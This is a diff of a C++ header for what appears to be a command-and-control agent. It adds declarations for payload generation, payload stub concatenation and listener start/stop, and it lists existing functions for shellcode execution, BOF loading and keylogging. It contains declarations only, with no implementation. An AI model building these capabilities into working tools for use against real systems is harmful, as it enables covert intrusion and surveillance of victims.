@@ -5,6 +5,7 @@
 #ifndef AGENT_HPP
 #define AGENT_HPP
 #include <argument_parser.hpp>
+#include <wintypes.hpp>
 #include <base.hpp>
 
 
@@ -27,12 +28,15 @@ public:
     result<std::string> runshellcode(reciever_context& ctx);
     result<std::string> runbof(reciever_context& ctx);
 
+    result<std::string> generate_payload(reciever_context& ctx) const;
     result<std::string> get_task(reciever_context& ctx) const;
     result<std::string> complete_task(reciever_context& ctx);
     result<std::string> print_tasks() const;
     result<std::string> print_staged_files() const;
     result<std::string> clear_tasks();
     result<std::string> print_listeners() const;
+    result<std::string> stop_listener(reciever_context& ctx) const;
+    result<std::string> start_listener(reciever_context& ctx) const;
 
     result<std::string> cp(reciever_context& ctx);
     result<std::string> cat(reciever_context& ctx);
@@ -45,12 +49,13 @@ public:
     result<std::string> indicate_exit(reciever_context& ctx);
     result<std::string> checkin(reciever_context& ctx);
     result<std::string> keylog(reciever_context& ctx);
-    result<std::string> start_listener(reciever_context& ctx) const;
+    result<std::string> generic_queue_task(const command& cmd, std::vector<std::string> args, const std::string& queue_message);
 
 
+    static result<bool>             add_payload_metadata(std::vector<char>& payload, const baphomet_metadata& metadata);
+    result<bool>                    concatenate_payload_stub(std::vector<char>& payload) const;
     static result<std::string>      delimit_command(const std::vector<std::string>& strings);
     static void                     init_commands();
-    result<std::string>             generic_queue_task(const command& cmd, std::vector<std::string> args, const std::string& queue_message);
     bool                            file_is_staged(const std::string& file_name) const;
 
 
